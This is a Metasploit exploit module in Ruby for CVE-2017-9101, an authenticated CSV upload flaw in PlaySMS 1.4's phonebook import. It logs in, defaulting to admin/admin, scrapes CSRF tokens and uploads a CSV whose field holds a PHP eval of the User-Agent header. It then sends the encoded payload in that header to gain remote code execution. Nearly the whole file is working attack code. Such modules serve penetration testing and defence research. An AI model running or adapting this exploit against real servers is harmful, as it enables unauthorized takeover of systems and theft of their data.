# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039; => &#039;PlaySMS import.php Authenticated CSV File Upload Code Execution&#039;,
      &#039;Description&#039; => %q{
          This module exploits an authenticated file upload remote code excution vulnerability
          in PlaySMS Version 1.4. This issue is caused by improper file contents handling in
          import.php (aka the Phonebook import feature). Authenticated Users can upload a CSV
          file containing a malicious payload via vectors involving the User-Agent HTTP header
          and PHP code in the User-Agent.
          This module was tested against PlaySMS 1.4 on VulnHub&#039;s Dina 1.0 machine and Windows 7.
      },
      &#039;Author&#039; =>
        [
          &#039;Touhid M.Shaikh <touhidshaikh22[at]gmail.com>&#039; # Discoverys and Metasploit Module
        ],
      &#039;License&#039; => MSF_LICENSE,
      &#039;References&#039; =>
        [
          [&#039;CVE&#039;,&#039;2017-9101&#039;],
          [&#039;URL&#039;,&#039;https://www.youtube.com/watch?v=KIB9sKQdEwE&#039;],
          [&#039;EDB&#039;,&#039;42044&#039;]
        ],
      &#039;DefaultOptions&#039; =>
        {
          &#039;SSL&#039;     => false,
          &#039;ENCODER&#039; => &#039;php/base64&#039;,
        },
      &#039;Privileged&#039; => false,
      &#039;Platform&#039;   => [&#039;php&#039;],
      &#039;Arch&#039;       => ARCH_PHP,
      &#039;Targets&#039; =>
        [
          [ &#039;PlaySMS 1.4&#039;, { } ],
        ],
      &#039;DefaultTarget&#039;  => 0,
      &#039;DisclosureDate&#039; => &#039;May 21 2017&#039;))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [ true, "Base playsms directory path", &#039;/&#039;]),
        OptString.new(&#039;USERNAME&#039;, [ true, "Username to authenticate with", &#039;admin&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [ true, "Password to authenticate with", &#039;admin&#039;])
      ])
  end

  def uri
    return target_uri.path
  end

  def check
    begin
      res = send_request_cgi({
        &#039;method&#039; => &#039;GET&#039;,
        &#039;uri&#039; => normalize_uri(uri, &#039;index.php&#039;)
      })
    rescue
      vprint_error(&#039;Unable to access the index.php file&#039;)
      return CheckCode::Unknown
    end

    if res.code == 302 && res.headers[&#039;Location&#039;].include?(&#039;index.php?app=main&inc=core_auth&route=login&#039;)
      return Exploit::CheckCode::Appears
    end

    return CheckCode::Safe
  end

  def login
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(uri, &#039;index.php&#039;),
      &#039;method&#039; => &#039;GET&#039;,
      &#039;vars_get&#039; => {
        &#039;app&#039; => &#039;main&#039;,
        &#039;inc&#039; => &#039;core_auth&#039;,
        &#039;route&#039; => &#039;login&#039;,
      }
    })

    # Grabbing CSRF token from body
    /name="X-CSRF-Token" value="(?<csrf>[a-z0-9"]+)">/ =~ res.body
    fail_with(Failure::UnexpectedReply, "#{peer} - Could not determine CSRF token") if csrf.nil?
    vprint_good("X-CSRF-Token for login : #{csrf}")

    cookies = res.get_cookies
    vprint_status(&#039;Trying to Login ......&#039;)
    # Send Creds with cookies.
    res = send_request_cgi({
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(uri, &#039;index.php&#039;),
      &#039;cookie&#039; => cookies,
      &#039;vars_get&#039; => Hash[{
        &#039;app&#039; => &#039;main&#039;,
        &#039;inc&#039; => &#039;core_auth&#039;,
        &#039;route&#039; => &#039;login&#039;,
        &#039;op&#039; => &#039;login&#039;,
      }.to_a.shuffle],
      &#039;vars_post&#039; => Hash[{
        &#039;X-CSRF-Token&#039; => csrf,
        &#039;username&#039; => datastore[&#039;USERNAME&#039;],
        &#039;password&#039; => datastore[&#039;PASSWORD&#039;]
      }.to_a.shuffle],
    })

    fail_with(Failure::UnexpectedReply, "#{peer} - Did not respond to Login request") if res.nil?

    # Try to access index page with authenticated cookie.
    res = send_request_cgi({
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(uri, &#039;index.php&#039;),
      &#039;cookie&#039; => cookies,
    })

    # if we redirect to core_welcome dan we assume we have authenticated cookie.
    if res.code == 302 && res.headers[&#039;Location&#039;].include?(&#039;index.php?app=main&inc=core_welcome&#039;)
      print_good("Authentication successful: #{datastore[&#039;USERNAME&#039;]}:#{datastore[&#039;PASSWORD&#039;]}")
      store_valid_credential(user: datastore[&#039;USERNAME&#039;], private: datastore[&#039;PASSWORD&#039;])
      return cookies
    else
      fail_with(Failure::UnexpectedReply, "#{peer} - Authentication Failed :[ #{datastore[&#039;USERNAME&#039;]}:#{datastore[&#039;PASSWORD&#039;]} ]")
    end
  end


  # Tested successfully on Dina: 1.0.1 machine on vulnhub.
  # Link : https://www.vulnhub.com/entry/dina-101,200/
  def exploit

    cookies = login

    # Agian CSRF token.
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(uri, &#039;index.php&#039;),
      &#039;method&#039; => &#039;GET&#039;,
      &#039;cookie&#039; => cookies,
      &#039;vars_get&#039; => Hash[{
        &#039;app&#039; => &#039;main&#039;,
        &#039;inc&#039; => &#039;feature_phonebook&#039;,
        &#039;route&#039; => &#039;import&#039;,
        &#039;op&#039; => &#039;list&#039;,
      }.to_a.shuffle]
    })

    fail_with(Failure::UnexpectedReply, "#{peer} - Did not respond to Login request") if res.nil?

    # Grabbing CSRF token from body
    /name="X-CSRF-Token" value="(?<csrf>[a-z0-9"]+)">/ =~ res.body
    fail_with(Failure::UnexpectedReply, "#{peer} - Could not determine CSRF token") if csrf.nil?
    vprint_good("X-CSRF-Token for upload : #{csrf}")

    # Payload.
    evil = "<?php $t=$_SERVER[&#039;HTTP_USER_AGENT&#039;]; eval($t); ?>"
    #making csv file body
    final_csv = "Name,Email,Department\n"
    final_csv << "#{evil},#{rand(1..100)},#{rand(1..100)}"
    # setup POST request.
    post_data = Rex::MIME::Message.new
    post_data.add_part(csrf, content_type = nil, transfer_encoding = nil, content_disposition = &#039;form-data; name="X-CSRF-Token"&#039;) # CSRF token
    post_data.add_part(final_csv, content_type = &#039;text/csv&#039;, transfer_encoding = nil, content_disposition = &#039;form-data; name="fnpb"; filename="agent22.csv"&#039;)  #payload
    data = post_data.to_s

    vprint_status(&#039;Trying to upload malicious CSV file ....&#039;)
    # Lets Send Upload request.
    res = send_request_cgi({
      &#039;uri&#039; => normalize_uri(uri, &#039;index.php&#039;),
      &#039;method&#039; => &#039;POST&#039;,
      &#039;agent&#039; => payload.encode,
      &#039;cookie&#039; => cookies,
      &#039;vars_get&#039; => Hash[{
        &#039;app&#039; => &#039;main&#039;,
        &#039;inc&#039; => &#039;feature_phonebook&#039;,
        &#039;route&#039; => &#039;import&#039;,
        &#039;op&#039; => &#039;import&#039;,
      }.to_a.shuffle],
      &#039;headers&#039; => {
        &#039;Upgrade-Insecure-Requests&#039; => &#039;1&#039;,
      },
      &#039;Connection&#039; => &#039;close&#039;,
      &#039;data&#039; => data,
      &#039;ctype&#039; => "multipart/form-data; boundary=#{post_data.bound}",
    })
  end
end

